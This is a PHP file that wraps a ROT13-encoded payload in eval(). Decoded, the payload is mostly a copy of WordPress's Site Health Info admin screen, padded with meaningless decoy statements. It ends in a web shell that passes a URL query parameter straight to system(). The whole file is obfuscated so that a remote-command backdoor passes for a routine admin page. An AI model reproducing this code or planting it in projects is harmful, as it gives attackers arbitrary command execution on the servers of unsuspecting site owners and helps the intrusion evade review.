<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Gbbyf Nqzvavfgengvba Fperra.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Nqzvavfgengvba
 */

vs ( ! qrsvarq( 'NOFCNGU' ) ) {
	qvr();
}

vs ( ! pynff_rkvfgf( 'JC_Qroht_Qngn' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-qroht-qngn.cuc';
}
vs ( ! pynff_rkvfgf( 'JC_Fvgr_Urnygu' ) ) {
	erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/pynff-jc-fvgr-urnygu.cuc';
}

$urnygu_purpx_fvgr_fgnghf = JC_Fvgr_Urnygu::trg_vafgnapr();

jc_nqzva_abgvpr(
	__( 'Gur Fvgr Urnygu purpx erdhverf WninFpevcg.' ),
	neenl(
		'glcr'               => 'reebe',
		'nqqvgvbany_pynffrf' => neenl( 'uvqr-vs-wf' ),
	)
);
?>

<qvi pynff=\"urnygu-purpx-obql urnygu-purpx-qroht-gno uvqr-vs-ab-wf\">
	<?cuc

	JC_Qroht_Qngn::purpx_sbe_hcqngrf();

	$vasb = JC_Qroht_Qngn::qroht_qngn();

	?>

	<u2>
		<?cuc _r( 'Fvgr Urnygu Vasb' ); ?>
	</u2>

	<c>
		<?cuc
			/* genafyngbef: %f: HEY gb Fvgr Urnygu Fgnghf cntr. */
			cevags( __( 'Guvf cntr pna fubj lbh rirel qrgnvy nobhg gur pbasvthengvba bs lbhe JbeqCerff jrofvgr. Sbe nal vzcebirzragf gung pbhyq or znqr, frr gur <n uers=\"%f\">Fvgr Urnygu Fgnghf</n> cntr.' ), rfp_hey( nqzva_hey( 'fvgr-urnygu.cuc' ) ) );
		?>
	</c>
	<c>
		<?cuc _r( 'Vs lbh jnag gb rkcbeg n unaql yvfg bs nyy gur vasbezngvba ba guvf cntr, lbh pna hfr gur ohggba orybj gb pbcl vg gb gur pyvcobneq. Lbh pna gura cnfgr vg va n grkg svyr naq fnir vg gb lbhe qrivpr, be cnfgr vg va na rznvy rkpunatr jvgu n fhccbeg ratvarre be gurzr/cyhtva qrirybcre sbe rknzcyr.' ); ?>
	</c>

	<qvi pynff=\"fvgr-urnygu-pbcl-ohggbaf\">
		<qvi pynff=\"pbcl-ohggba-jenccre\">
			<ohggba glcr=\"ohggba\" pynff=\"ohggba pbcl-ohggba\" qngn-pyvcobneq-grkg=\"<?cuc rpub rfp_ngge( JC_Qroht_Qngn::sbezng( $vasb, 'qroht' ) ); ?>\">
				<?cuc _r( 'Pbcl fvgr vasb gb pyvcobneq' ); ?>
			</ohggba>
			<fcna pynff=\"fhpprff uvqqra\" nevn-uvqqra=\"gehr\"><?cuc _r( 'Pbcvrq!' ); ?></fcna>
		</qvi>
	</qvi>

	<qvi vq=\"urnygu-purpx-qroht\" pynff=\"urnygu-purpx-nppbeqvba\">

		<?cuc

		$fvmrf_svryqf = neenl( 'hcybnqf_fvmr', 'gurzrf_fvmr', 'cyhtvaf_fvmr', 'sbagf_fvmr', 'jbeqcerff_fvmr', 'qngnonfr_fvmr', 'gbgny_fvmr' );

		sbernpu ( $vasb nf $frpgvba => $qrgnvyf ) {
			vs ( ! vffrg( $qrgnvyf['svryqf'] ) || rzcgl( $qrgnvyf['svryqf'] ) ) {
				pbagvahr;
			}

			?>
			<u3 pynff=\"urnygu-purpx-nppbeqvba-urnqvat\">
				<ohggba nevn-rkcnaqrq=\"snyfr\" pynff=\"urnygu-purpx-nppbeqvba-gevttre\" nevn-pbagebyf=\"urnygu-purpx-nppbeqvba-oybpx-<?cuc rpub rfp_ngge( $frpgvba ); ?>\" glcr=\"ohggba\">
					<fcna pynff=\"gvgyr\">
						<?cuc rpub rfp_ugzy( $qrgnvyf['ynory'] ); ?>
						<?cuc

						vs ( vffrg( $qrgnvyf['fubj_pbhag'] ) && $qrgnvyf['fubj_pbhag'] ) {
							cevags(
								'(%f)',
								ahzore_sbezng_v18a( pbhag( $qrgnvyf['svryqf'] ) )
							);
						}

						?>
					</fcna>
					<?cuc

					vs ( 'jc-cnguf-fvmrf' === $frpgvba ) {
						?>
						<fcna pynff=\"urnygu-purpx-jc-cnguf-fvmrf fcvaare\"></fcna>
						<?cuc
					}

					?>
					<fcna pynff=\"vpba\"></fcna>
				</ohggba>
			</u3>

			<qvi vq=\"urnygu-purpx-nppbeqvba-oybpx-<?cuc rpub rfp_ngge( $frpgvba ); ?>\" pynff=\"urnygu-purpx-nppbeqvba-cnary\" uvqqra=\"uvqqra\">
				<?cuc

				vs ( vffrg( $qrgnvyf['qrfpevcgvba'] ) && ! rzcgl( $qrgnvyf['qrfpevcgvba'] ) ) {
					cevags( '<c>%f</c>', $qrgnvyf['qrfpevcgvba'] );
				}

				?>
				<gnoyr pynff=\"jvqrsng fgevcrq urnygu-purpx-gnoyr\">
					<gobql>
					<?cuc

					sbernpu ( $qrgnvyf['svryqf'] nf $svryq_anzr => $svryq ) {
						vs ( vf_neenl( $svryq['inyhr'] ) ) {
							$inyhrf = '<hy>';

							sbernpu ( $svryq['inyhr'] nf $anzr => $inyhr ) {
								$inyhrf .= fcevags( '<yv>%f: %f</yv>', rfp_ugzy( $anzr ), rfp_ugzy( $inyhr ) );
							}

							$inyhrf .= '</hy>';
						} ryfr {
							$inyhrf = rfp_ugzy( $svryq['inyhr'] );
						}

						vs ( va_neenl( $svryq_anzr, $fvmrf_svryqf, gehr ) ) {
							cevags( '<ge><gu fpbcr=\"ebj\">%f</gu><gq pynff=\"%f\">%f</gq></ge>', rfp_ugzy( $svryq['ynory'] ), rfp_ngge( $svryq_anzr ), $inyhrf );
						} ryfr {
							cevags( '<ge><gu fpbcr=\"ebj\">%f</gu><gq>%f</gq></ge>', rfp_ugzy( $svryq['ynory'] ), $inyhrf );
						}
					}

					?>
					</gobql>
				</gnoyr>
			</qvi>
		<?cuc } ?>
	</qvi>
</qvi>

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>